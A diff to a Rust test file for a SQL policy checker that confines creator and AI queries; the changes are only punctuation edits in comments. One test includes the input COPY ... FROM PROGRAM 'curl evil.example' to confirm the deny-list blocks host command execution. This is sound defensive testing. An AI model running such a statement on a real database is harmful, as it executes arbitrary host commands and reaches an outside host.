@@ -37,7 +37,7 @@ fn explicit_confined_charter_fixture_composes() {
 /// Retargeting a config carries the composed policy across unchanged: `for_dialect`
 /// selects WHICH backend vets the SQL, never WHAT the policy grants.
 ///
-/// It used to assert a second thing alongside — that a host-set belt-off mode
+/// It used to assert a second thing alongside - that a host-set belt-off mode
 /// survived onto PostgreSQL and was reset to `Enforced` for every other id. Both
 /// halves of that are gone with the mode itself: there is no belt-off posture to
 /// carry, so nothing to reset and nothing a future backend could inherit. The
@@ -113,7 +113,7 @@ fn confined_allows_a_plain_create_table() {
 
 #[test]
 fn confined_denies_a_copy_program_rce() {
-    // `COPY ... FROM PROGRAM` is arbitrary host command execution — the deny-list
+    // `COPY ... FROM PROGRAM` is arbitrary host command execution - the deny-list
     // must reject it under the confined (creator/AI) posture.
     let err = confined()
         .check("COPY app1.t FROM PROGRAM 'curl evil.example'")
